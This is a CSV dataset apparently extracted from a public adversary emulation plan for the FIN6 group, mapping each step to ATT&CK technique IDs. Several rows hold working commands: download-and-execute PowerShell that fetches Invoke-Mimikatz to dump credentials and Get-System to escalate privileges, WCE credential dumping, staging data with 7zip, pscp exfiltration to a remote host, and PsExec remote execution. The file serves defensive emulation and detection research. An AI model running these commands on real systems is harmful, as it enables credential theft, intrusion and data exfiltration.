org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
fin6,fin6,unknown,fin6::11,11,Enumerate AD groups,"id: 2738b811-a360-4a4f-af9d-704343ebab4d | name: Enumerate AD groups | description: List groups and output the results to a text file. | tactic: discovery | technique: attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups | cti_source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html | procedure_group: procedure_discovery | procedure_step: 2.6 | platforms: windows: cmd: command: ""#{adfind_exe}"" -f (objectcategory=group) > ad_group.txt
 | payloads: adfind.exe | input_arguments: adfind_exe: description: Path of adfind.exe | type: Path | default: adfind.exe | adfind_url: description: Path to download ADFind zip file | type: URL | default: http://www.joeware.net/downloads/files/AdFind.zip | adfind_zip_hash: description: File hash of the ADFind zip file | type: String | dependency_executor_name: powershell | dependencies: description: Adfind.exe must exist on disk at specified location (#{adfind_exe}) | prereq_command: if (Test-Path ""#{adfind_exe}"") {exit 0} else {exit 1}
 | get_prereq_command: $parentpath = Split-Path ""#{adfind_exe}""; $zippath = ""$parentpath\adfind.zip""
IEX(IWR ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"")
if(Invoke-WebRequestVerifyHash ""#{adfind_url}"" $zippath ""#{adfind_zip_hash}"") {
Expand-Archive $zippath $parentpath\adfind -Force
Move-Item $parentpath\adfind\adfind.exe ""#{adfind_exe}""
Remove-Item $zippath, $parentpath\adfind -Recurse
}
 | executors: name: command_prompt | command: ""#{adfind_exe}"" -f (objectcategory=group) > ad_group.txt
","[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::12,12,Permission Groups Discovery: Domain Groups,attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups,"[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::13,13,PowerSploit Named-Pipe Impersonation,"id: a89ea459-97ec-28fd-a552-9d305f023bbe | name: PowerSploit Named-Pipe Impersonation | description: PowerSploit named-pipe impersonation, similar to the technique used to escalate to SYSTEM-level privileges by FIN6. | tactic: privilege-escalation | technique: attack_id: T1134 | name: Access Token Manipulation | procedure_group: procedure_privesc | procedure_step: 3.1 | platforms: windows: psh: command: powershell.exe -exec bypass -C ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'""
 | executors: name: command_prompt | command: powershell.exe -exec bypass -C ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'""
","[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::14,14,Access Token Manipulation,attack_id: T1134 | name: Access Token Manipulation,"[""T1134""]","[""T1134""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::15,15,PowerSploit Invoke-Mimikatz,"id: ff77db3d-ded1-48da-9885-8dfc097edec0 | name: PowerSploit Invoke-Mimikatz | description: Dump credentials from memory via PowerShell by invoking a remote Mimikatz script, similar to the procedure used by FIN6. | tactic: credential-access | technique: attack_id: T1003.001 | name: OS Credential Dumping: LSASS Memory - Invoke-Mimikatz | cti_source: https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ | procedure_group: procedure_privesc | procedure_step: 3.2 | platforms: windows: psh: command: powershell.exe -exec bypass -C ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""
 | executors: name: command_prompt | command: powershell.exe -exec bypass -C ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""
","[""T1003.001""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::16,16,OS Credential Dumping: LSASS Memory - Invoke-Mimikatz,attack_id: T1003.001 | name: OS Credential Dumping: LSASS Memory - Invoke-Mimikatz,"[""T1003.001""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::17,17,WCE Credential Access,"id: 97412b40-4940-4da1-8bff-6f11d42bca26 | name: WCE Credential Access | description: FIN6 is reported to have used WCE to access credentials on at least one occasion. | tactic: credential-access | technique: attack_id: T1003.001 | name: OS Credential Dumping: LSASS Memory - Windows Credential Editor (WCE) | cti_source: https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf | procedure_group: procedure_cred_access | procedure_step: 3.4 | platforms: windows: cmd: command: ""#{wce_exe}"" -w -o ""#{output_file}""
 | payloads: wce.exe | cleanup: del ""#{output_file}"" >nul 2>&1
 | input_arguments: output_file: description: Path where resulting data should be placed | type: Path | default: %temp%\wce-output.txt | wce_exe: description: Path of Windows Credential Editor | type: Path | default: wce.exe | wce_url: description: Path to download Windows Credential Editor zip file | type: URL | default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip | wce_zip_hash: description: File hash of the Windows Credential Editor zip file | type: string | dependency_executor_name: powershell | dependencies: description: Windows Credential Editor must exist on disk at specified location (#{wce_exe}) | prereq_command: if (Test-Path ""#{wce_exe}"") {exit 0} else {exit 1}
 | get_prereq_command: $parentpath = Split-Path ""#{wce_exe}""; $zippath = ""$parentpath\wce.zip""
IEX(IWR ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"")
if(Invoke-WebRequestVerifyHash ""#{wce_url}"" $zippath ""#{wce_zip_hash}"") {
Expand-Archive $zippath $parentpath\wce -Force
Move-Item $parentpath\wce\wce.exe ""#{wce_exe}""
Remove-Item $zippath, $parentpath\wce -Recurse
}
 | executors: name: command_prompt | elevation_required: True | command: ""#{wce_exe}"" -w -o ""#{output_file}""
 | cleanup_command: del ""#{output_file}"" >nul 2>&1
","[""T1003.001""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::18,18,OS Credential Dumping: LSASS Memory - Windows Credential Editor (WCE),attack_id: T1003.001 | name: OS Credential Dumping: LSASS Memory - Windows Credential Editor (WCE),"[""T1003.001""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::19,19,Compress Files with 7zip (7.exe),"id: fd27fe6c-4846-4e94-aef9-f6bc21ab0f0e | name: Compress Files with 7zip (7.exe) | description: Compress text files for exfiltration staging using 7zip, renamed to 7.exe | tactic: collection | technique: attack_id: T1560.001 | name: Archive Collected Data: Archive via Utility | cti_source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html | procedure_group: procedure_collection | procedure_step: 4.1.1 | platforms: windows: cmd: command: ""#{7zip_exe}"" a -mx3 ad.7z ad_*
 | payloads: 7za.exe | input_arguments: 7zip_exe: description: Path of 7za.exe | type: Path | default: C:\Windows\Temp\7za.exe | 7zip_url: description: Path to download 7za zip file | type: URL | default: https://www.7-zip.org/a/7za920.zip | 7zip_hash: description: File hash of the 7za zip file | type: String | dependency_executor_name: powershell | dependencies: description: 7zip.exe must exist on disk at specified location (""#{7zip_exe}"") | prereq_command: if (Test-Path ""#{7zip_exe}"") {exit 0} else {exit 1}
 | get_prereq_command: $parentpath = Split-Path ""#{7zip_exe}""; $zippath = ""$parentpath\7za920.zip""
IEX(IWR ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"")
if(Invoke-WebRequestVerifyHash ""#{7zip_url}"" $zippath ""#{7zip_hash}"") {
Expand-Archive $zippath $parentpath\7za920 -Force
Move-Item $parentpath\7za920\7za.exe ""#{7zip_exe}""
Remove-Item $zippath, $parentpath\7za920 -Recurse
}
 | executors: name: command_prompt | command: ""#{7zip_exe}"" a -mx3 ad.7z ad_*
","[""T1560.001""]","[""T1560""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::20,20,Archive Collected Data: Archive via Utility,attack_id: T1560.001 | name: Archive Collected Data: Archive via Utility,"[""T1560.001""]","[""T1560""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::21,21,Exfiltration with PSCP,"id: 6824cbb6-f3e1-4081-8a63-d72ae368cb23 | name: Exfiltration with PSCP | description: Initiate an interactive SSH session with a remote server with pscp | tactic: exfiltration | technique: attack_id: T1567.002 | name: Exfiltration Over Web Service: Exfiltration to Cloud Storage | cti_source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html | procedure_group: procedure_exfiltration | procedure_step: 4.1.2 | platforms: windows: cmd: command: ""#{pscp_exe}"" -P #{pscp_port} ""#{pscp_exfil_files}"" ""#{pscp_remote_user}@#{pscp_remote_host}:#{pscp_drop_location}""
 | payloads: pscp.exe | input_arguments: pscp_port: description: Connection port for use with pscp | type: String | default: 22 | pscp_exfil_files: description: Files to be exfiltrated | type: Path | default: C:\Windows\Temp\ad_* | pscp_remote_user: description: Remote user to connect with pscp | type: String | default: root | pscp_remote_host: description: Hostname or IP to connect with pscp | type: String | default: 192.0.2.20 | pscp_drop_location: description: Remote location to drop exfiltration files with pscp | type: Path | default: /temp/loot | pscp_url: description: Path to download pscp exe file | type: URL | default: https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe | pscp_exe: description: Path of pscp.exe | type: Path | default: C:\Windows\Temp\pscp.exe | dependency_executor_name: powershell | dependencies: description: pscp.exe must exist on disk at specified location (""#{pscp_exe}"")
 | prereq_command: if (Test-Path ""#{pscp_exe}"") {exit 0} else {exit 1}
 | get_prereq_command: Invoke-WebRequest ""#{pscp_url}"" -OutFile ""#{pscp_exe}""
 | executors: name: command_prompt | command: ""#{pscp_exe}"" -P #{pscp_port} ""#{pscp_exfil_files}"" ""#{pscp_remote_user}@#{pscp_remote_host}:#{pscp_drop_location}""
","[""T1567.002""]","[""T1567""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::22,22,Exfiltration Over Web Service: Exfiltration to Cloud Storage,attack_id: T1567.002 | name: Exfiltration Over Web Service: Exfiltration to Cloud Storage,"[""T1567.002""]","[""T1567""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::23,23,Exfiltrate Data via SSH,"id: 78d94199-7e0e-442b-81a6-32f8e419a7ac | name: Exfiltrate Data via SSH | description: Initiate an interactive SSH session with a remote server | tactic: exfiltration | technique: attack_id: T1567.002 | name: Exfiltration Over Web Service: Exfiltration to Cloud Storage | cti_source: https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html | procedure_group: procedure_exfiltration | procedure_step: 4.2 | platforms: windows: cmd: command: ""#{putty_exe}"" -ssh #{user}@#{exfil_server}
 | payloads: putty.exe | input_arguments: putty_exe: description: Path of putty.exe | type: Path | default: putty.exe | putty_url: description: Path to download putty file | type: URL | default: https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe
 | putty_hash: description: File hash of the putty exe file | type: String | user: description: username | type: string | exfil_server: description: hostname or IP address | type: string | default: 127.0.0.1 | dependency_executor_name: powershell | dependencies: description: putty.exe must exist on disk at specified location (#{putty_exe})
 | prereq_command: if (Test-Path ""#{putty_exe}"") {exit 0} else {exit 1}
 | get_prereq_command: $parentpath = Split-Path ""#{putty_exe}""; $zippath = ""$parentpath\putty.zip""
IEX(IWR ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"")
if(Invoke-WebRequestVerifyHash ""#{putty_url}"" $zippath ""#{putty_hash}"") {
Expand-Archive $zippath $parentpath\putty -Force
Move-Item $parentpath\putty\putty.exe ""#{putty_exe}""
Remove-Item $zippath, $parentpath\putty -Recurse
}
 | executors: name: command_prompt | command: ""#{putty_exe}"" -ssh #{user}@#{exfil_server}
","[""T1567.002""]","[""T1567""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::24,24,Exfiltration Over Web Service: Exfiltration to Cloud Storage,attack_id: T1567.002 | name: Exfiltration Over Web Service: Exfiltration to Cloud Storage,"[""T1567.002""]","[""T1567""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::25,25,PsExec Remote Command,"id: e4027dff-280b-4964-82be-b35a40c4a493 | name: PsExec Remote Command | description: Use PsExec to execute a command on a remote host. FIN6 is reported to have used a variant of PsExec to execute code on remote hosts. | tactic: execution | technique: attack_id: T1569.002 | name: System Services: Service Execution | cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html | procedure_group: procedure_pos_execution | procedure_step: 5.1 | platforms: windows: cmd: command: ""#{psexec_exe}"" \\#{remote_host} #{remote_command}
 | payloads: PsExec.exe | input_arguments: psexec_exe: description: Path to Psexec | type: string | default: C:\PSTools\PsExec.exe | remote_host: description: Remote host or IP address | type: string | default: localhost | remote_command: description: Remote command to run | type: string | default: calc.exe | dependency_executor_name: powershell | dependencies: description: PsExec must exist on disk at specified location (#{psexec_exe})
 | prereq_command: if (Test-Path ""#{psexec_exe}"") {exit 0} else {exit 1}
 | get_prereq_command: Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""$env:TEMP\PSTools.zip""
Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
New-Item -ItemType Directory (""#{psexec_exe}"") -Force | Out-Null
Copy-Item $env:TEMP\PsTools\PsExec.exe ""#{psexec_exe}"" -Force
 | executors: name: powershell | elevation_required: False | command: ""#{psexec_exe}"" \\#{remote_host} #{remote_command}
","[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
fin6,fin6,unknown,fin6::26,26,System Services: Service Execution,attack_id: T1569.002 | name: System Services: Service Execution,"[""T1569.002""]","[""T1569""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\fin6\Emulation_Plan\yaml\FIN6.yaml,yaml_regex_extract,high
